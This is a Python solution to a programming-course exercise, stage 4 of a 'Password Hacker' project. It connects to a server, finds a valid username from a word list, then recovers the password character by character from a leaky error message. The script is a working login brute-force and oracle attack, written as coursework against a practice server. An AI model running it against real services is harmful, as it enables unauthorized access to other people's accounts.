# Password Hacker: Stage 4/5
# https://hyperskill.org/projects/80/stages/445/implement

import os
import sys
import socket
import json
import string

with open(os.path.join(os.path.dirname(__file__), 'logins.txt'), "r", encoding="utf-8") as file:
    logins = file.read().split()

address = (sys.argv[1], int(sys.argv[2]))
SYMBOLS = string.ascii_letters + string.digits
password = ''

with socket.socket() as client_socket:
    client_socket.connect(address)
    for login in logins:  # Search for login name
        credentials = {'login': login, 'password': ''}
        client_socket.send(json.dumps(credentials).encode())
        response = json.loads(client_socket.recv(1024).decode())['result']

        while response != 'Wrong login!':  # Found login name
            for char in SYMBOLS:  # Search for next character in password
                credentials = {'login': login, 'password': password + char}

                client_socket.send(json.dumps(credentials).encode())
                response = json.loads(client_socket.recv(1024).decode())['result']

                if response == 'Exception happened during login':
                    password += char  # Found next character in the password
                    break

                elif response == 'Connection success!':  # Found the password
                    print(json.dumps(credentials))
                    exit()
